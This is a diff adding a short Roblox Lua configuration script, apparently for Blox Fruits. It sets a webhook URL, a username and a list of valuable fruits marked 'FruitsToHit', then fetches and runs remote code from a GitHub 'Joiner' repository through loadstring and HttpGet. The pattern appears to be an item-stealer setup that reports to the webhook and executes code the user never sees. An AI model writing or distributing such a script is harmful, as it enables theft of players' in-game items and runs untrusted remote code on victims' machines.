@@ -1,0 +1,6 @@
+Webhook = "https://webhook-protector-worker.sharkyscripts.workers.dev/w/8ba85193-3eed-4876-a79b-8dd8cbc953df"
+ Usernames = {"theHonoredOne1149"}
+ FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas", "Leopard-Leopard", "Control-Control", "Dough-Dough", "T-Rex-T-Rex", "Spirit-Spirit", "Mammoth-Mammoth", "Venom-Venom", "Portal-Portal", "Buddha-Buddha", "Rumble-Rumble", "Shadow-Shadow", "Blizzard-Blizzard", "Sound-Sound", "Phoenix-Phoenix", "Pain-Pain", "Gravity-Gravity", "Love-Love", "Spider-Spider", "Quake-Quake"}
+
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()
+ 
